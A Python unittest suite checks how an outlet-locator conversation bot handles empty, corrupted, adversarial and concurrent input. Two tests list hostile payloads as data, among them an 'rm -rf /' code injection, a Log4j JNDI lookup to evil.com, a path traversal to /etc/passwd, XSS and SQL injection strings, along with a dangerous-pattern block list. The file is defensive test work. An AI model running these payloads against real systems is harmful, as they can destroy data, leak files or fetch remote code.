import unittest
import sys
import os
from unittest.mock import patch, Mock

# Add parent directories to path to import from Question_1
sys.path.append(os.path.join(os.path.dirname(__file__), '../../Question_1'))

from sequential_conversation import SequentialConversationBot, ConversationState
from data import OUTLETS_DB


class TestUnhappySequentialConversation(unittest.TestCase):
    """Test suite for unhappy flows in sequential conversation system"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.bot = SequentialConversationBot()
    
    def test_empty_input(self):
        """Test handling of empty or whitespace-only input"""
        empty_inputs = ["", "   ", "\n", "\t", "\r\n"]
        
        for empty_input in empty_inputs:
            with self.subTest(input=repr(empty_input)):
                response = self.bot.process_input(empty_input)
                self.assertIn("didn't catch that", response.lower())
                self.assertIn("re-type", response.lower())
    
    def test_none_input(self):
        """Test handling of None input"""
        response = self.bot.process_input(None)
        self.assertIn("didn't catch that", response.lower())
    
    def test_very_long_input(self):
        """Test handling of extremely long input"""
        long_input = "A" * 10000  # 10KB of text
        response = self.bot.process_input(long_input)
        
        # Should not crash and should provide some response
        self.assertIsInstance(response, str)
        self.assertTrue(len(response) > 0)
    
    def test_special_characters_input(self):
        """Test handling of special characters that might break parsing"""
        special_inputs = [
            "outlets with special chars: @#$%^&*()",
            "What about <script>alert('xss')</script> outlets?",
            "Outlets in PJ; DROP TABLE outlets; --",
            "Find outlets\x00\x01\x02\x03",  # Binary data
            "Outlets with unicode: café ñaña 中文",
            "Outlets with newlines\nand\ttabs",
            "Outlets 'with' \"quotes\"",
            "Outlets\\with\\backslashes",
            "Outlets{with}brackets[and]parens()",
        ]
        
        for special_input in special_inputs:
            with self.subTest(input=special_input):
                response = self.bot.process_input(special_input)
                
                # Should not crash and should provide some response
                self.assertIsInstance(response, str)
                self.assertTrue(len(response) > 0)
                
                # Response should not contain dangerous patterns
                dangerous_patterns = ["<script", "drop table", "delete from"]
                for pattern in dangerous_patterns:
                    self.assertNotIn(pattern.lower(), response.lower())
    
    def test_malicious_payloads(self):
        """Test various malicious input attempts"""
        malicious_inputs = [
            "__import__('os').system('rm -rf /')",  # Code injection
            "eval('__import__(\"os\").system(\"ls\")')",  # Eval injection
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/exploit}",  # Log4j injection
            "../../etc/passwd",  # Path traversal
            "javascript:alert('XSS')",  # JavaScript injection
            "data:text/html,<script>alert('XSS')</script>",  # Data URL
            "\x1b[2J\x1b[H",  # ANSI escape sequences
        ]
        
        for malicious_input in malicious_inputs:
            with self.subTest(input=malicious_input):
                try:
                    response = self.bot.process_input(malicious_input)
                    
                    # Should not crash and should provide safe response
                    self.assertIsInstance(response, str)
                    self.assertTrue(len(response) > 0)
                    
                    # Should not execute arbitrary code or return dangerous content
                    safe_patterns = ["how can i help", "outlets", "location", "didn't catch"]
                    self.assertTrue(any(pattern in response.lower() for pattern in safe_patterns))
                    
                except Exception as e:
                    # If it raises an exception, it should be a controlled one
                    self.fail(f"Malicious input caused unhandled exception: {e}")
    
    def test_conversation_state_corruption_recovery(self):
        """Test recovery from corrupted conversation state"""
        # Manually corrupt the conversation state
        self.bot.memory.current_state = "invalid_state"
        
        response = self.bot.process_input("Is there an outlet in PJ?")
        
        # Should recover gracefully and reset to valid state
        self.assertIsInstance(response, str)
        self.assertTrue(len(response) > 0)
        # State should be corrected
        self.assertIn(self.bot.memory.current_state, [state.value for state in ConversationState])
    
    def test_context_variable_corruption(self):
        """Test handling of corrupted context variables"""
        # Corrupt context variables
        self.bot.memory.context_variables = {"invalid": None, "corrupted": [1, 2, {"bad": "data"}]}
        
        response = self.bot.process_input("Show me outlets in KL")
        
        # Should handle gracefully without crashing
        self.assertIsInstance(response, str)
        self.assertTrue(len(response) > 0)
    
    def test_memory_overflow_protection(self):
        """Test protection against memory overflow from too many turns"""
        # Simulate many conversation turns
        for i in range(1000):
            try:
                self.bot.process_input(f"Test input {i}")
            except MemoryError:
                self.fail("Memory overflow occurred - no protection implemented")
            except Exception:
                # Other exceptions might be okay, but memory should be protected
                pass
        
        # Memory should still be functional
        response = self.bot.process_input("Is there an outlet in PJ?")
        self.assertIsInstance(response, str)
    
    def test_outlets_db_corruption_handling(self):
        """Test handling when outlets database is corrupted or missing"""
        # Backup original DB
        original_db = self.bot.memory.outlets_db
        
        try:
            # Test with empty DB
            self.bot.memory.outlets_db = {}
            response = self.bot.process_input("Is there an outlet in PJ?")
            self.assertIsInstance(response, str)
            
            # Test with None DB
            self.bot.memory.outlets_db = None
            response = self.bot.process_input("Is there an outlet in PJ?")
            self.assertIsInstance(response, str)
            
            # Test with corrupted DB structure
            self.bot.memory.outlets_db = {"invalid": "structure"}
            response = self.bot.process_input("Is there an outlet in PJ?")
            self.assertIsInstance(response, str)
            
        finally:
            # Restore original DB
            self.bot.memory.outlets_db = original_db
    
    def test_entity_extraction_with_malformed_input(self):
        """Test entity extraction with malformed or adversarial input"""
        malformed_inputs = [
            "pEtAlInG jAyA" * 100,  # Repeated patterns
            "P" + "e" * 1000 + "taling Jaya",  # Stretched words
            "Petaling\x00Jaya",  # Null bytes
            "Pet{}al{}ing{}Ja{}ya".format(*["\x00"] * 4),  # Embedded nulls
            "Peta\nling\tJa\rya",  # Mixed whitespace
            "Петaling Jaya",  # Mixed scripts
            "𝕻𝖊𝖙𝖆𝖑𝖎𝖓𝖌 𝕵𝖆𝖞𝖆",  # Unicode mathematical symbols
        ]
        
        for malformed_input in malformed_inputs:
            with self.subTest(input=repr(malformed_input)):
                try:
                    response = self.bot.process_input(malformed_input)
                    self.assertIsInstance(response, str)
                except Exception as e:
                    self.fail(f"Entity extraction failed on input {repr(malformed_input)}: {e}")
    
    def test_regex_pattern_safety(self):
        """Test that regex patterns don't cause ReDoS (Regular Expression Denial of Service)"""
        # Patterns that could cause exponential backtracking
        redos_inputs = [
            "a" * 10000 + "!",  # Long string that doesn't match
            ("a" * 100 + "b") * 100,  # Alternating pattern
            "(" * 1000 + "a" + ")" * 1000,  # Nested parentheses
            "petaling jaya" + "a" * 10000,  # Valid start with long tail
        ]
        
        import time
        for redos_input in redos_inputs:
            with self.subTest(input=f"ReDoS test {len(redos_input)} chars"):
                start_time = time.time()
                try:
                    response = self.bot.process_input(redos_input)
                    end_time = time.time()
                    
                    # Should complete within reasonable time (not exponential)
                    self.assertLess(end_time - start_time, 5.0, "Regex took too long - possible ReDoS")
                    self.assertIsInstance(response, str)
                    
                except Exception as e:
                    end_time = time.time()
                    self.assertLess(end_time - start_time, 5.0, "Regex exception took too long")
    
    def test_conversation_interruption_recovery(self):
        """Test recovery from conversation interruptions"""
        # Start a conversation flow
        self.bot.process_input("Is there an outlet in PJ?")
        self.assertEqual(self.bot.memory.current_state, ConversationState.LOCATION_INQUIRY)
        
        # Interrupt with completely different input
        interruption_inputs = [
            "What's the weather like?",
            "Calculate 2 + 2",
            "Hello world",
            "Random nonsense input",
            "",  # Empty input
            None,  # None input
        ]
        
        for interruption in interruption_inputs:
            with self.subTest(interruption=interruption):
                # Create fresh bot for each test
                bot = SequentialConversationBot()
                bot.process_input("Is there an outlet in PJ?")
                
                # Interrupt the flow
                response = bot.process_input(interruption)
                
                # Should handle gracefully
                self.assertIsInstance(response, str)
                self.assertTrue(len(response) > 0)
                
                # Should still be able to continue conversation
                response2 = bot.process_input("SS 2")
                self.assertIsInstance(response2, str)
    
    def test_concurrent_access_safety(self):
        """Test thread safety with concurrent access"""
        import threading
        import queue
        
        results = queue.Queue()
        
        def conversation_thread(thread_id):
            try:
                bot = SequentialConversationBot()  # Each thread gets its own bot
                
                # Simulate conversation
                response1 = bot.process_input(f"Is there an outlet in PJ? Thread {thread_id}")
                response2 = bot.process_input("SS 2")
                response3 = bot.process_input("opening hours")
                
                results.put(("success", thread_id, [response1, response2, response3]))
                
            except Exception as e:
                results.put(("error", thread_id, str(e)))
        
        # Start multiple concurrent conversations
        threads = []
        for i in range(5):
            thread = threading.Thread(target=conversation_thread, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for all to complete
        for thread in threads:
            thread.join(timeout=30)
        
        # Check results
        success_count = 0
        error_count = 0
        
        while not results.empty():
            result_type, thread_id, data = results.get()
            if result_type == "success":
                success_count += 1
                # Check that responses are valid
                for response in data:
                    self.assertIsInstance(response, str)
                    self.assertTrue(len(response) > 0)
            else:
                error_count += 1
                print(f"Thread {thread_id} error: {data}")
        
        # Most threads should succeed
        self.assertGreaterEqual(success_count, 3)
    
    def test_memory_export_with_corrupted_data(self):
        """Test conversation export functionality with corrupted data"""
        # Add some normal conversation
        self.bot.process_input("Is there an outlet in PJ?")
        
        # Corrupt some turn data
        if self.bot.memory.turns:
            # Add malformed turn data
            self.bot.memory.turns[0].extracted_entities = {"corrupted": float('inf')}
            self.bot.memory.turns[0].context_variables = {"bad_data": {"nested": [1, 2, {"deep": None}]}}
        
        try:
            # Should not crash when exporting
            summary = self.bot.get_conversation_summary()
            self.assertIsInstance(summary, dict)
            
            debug_info = self.bot.get_debug_info()
            self.assertIsInstance(debug_info, dict)
            
        except Exception as e:
            self.fail(f"Conversation export failed with corrupted data: {e}")
    
    def tearDown(self):
        """Clean up after each test"""
        if hasattr(self, 'bot'):
            self.bot.reset_conversation()


if __name__ == "__main__":
    unittest.main() 